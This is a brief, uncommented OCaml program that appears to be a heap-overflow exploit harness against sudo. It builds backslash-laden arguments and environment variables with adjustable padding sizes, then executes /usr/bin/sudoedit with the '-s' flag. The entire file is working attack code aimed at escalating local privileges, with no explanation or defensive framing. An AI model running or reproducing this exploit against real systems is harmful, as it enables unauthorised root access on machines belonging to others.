let prepenv lc envnum fil =
        let locale = String.make lc '0' in
        let env = Array.make envnum "\\" in
        let filler = String.make fil '0' in

        env.(envnum - 4) <-"X/X";
        env.(envnum - 3) <- filler;
        env.(envnum - 2) <- "\\";
        env.(envnum - 1) <- "LC_ALL=C.UTF-8@" ^ locale;
        env

let prepargs zeroes ones =
        let arg0 = "sudoedit" in
        let arg1 = "-s" in
        let arg2 = String.make zeroes '0' in
        let arg3 = "\\" in
        let arg4 = String.make ones '1' in

        let args = Array.make 5 "" in

        args.(0) <- arg0;
        args.(1) <- arg1;
        args.(2) <- arg2 ^ "\\";
        args.(3) <- arg3;
        args.(4) <- arg4 ^ "\\";
        args

open Sys

let fn () =
        let env = prepenv (int_of_string argv.(1)) (int_of_string argv.(2)) (int_of_string argv.(3))  in
        let args = prepargs (int_of_string argv.(4))  (int_of_string argv.(5)) in
        let () = Unix.execve "/usr/bin/sudoedit" args env in
()

let () = fn ()
